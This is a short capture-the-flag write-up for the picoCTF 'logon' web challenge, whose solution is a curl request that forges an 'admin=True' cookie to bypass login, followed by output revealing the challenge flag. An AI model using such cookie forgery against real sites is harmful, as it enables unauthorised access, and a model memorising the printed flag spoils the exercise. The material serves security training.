### logon
## Objetivo
The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? `https://jupiter.challenges.picoctf.org/problem/15796/` ([link](https://jupiter.challenges.picoctf.org/problem/15796/)) or http://jupiter.challenges.picoctf.org:15796

## Hints
1. Hmm it doesn't seem to check anyone's password, except for Joe's?
## Datos de acceso al nivel
## Solución
```bash
alivz-picoctf@webshell:~$ curl https://jupiter.challenges.picoctf.org/problem/15796/flag -H "Cookie: admin=True" | grep pico
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1312  100  1312    0     0   3243      0 --:--:-- --:--:-- --:--:--  3239
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_6edb3f5f}</code></p>
```
## Notas adicionales
## Referencias


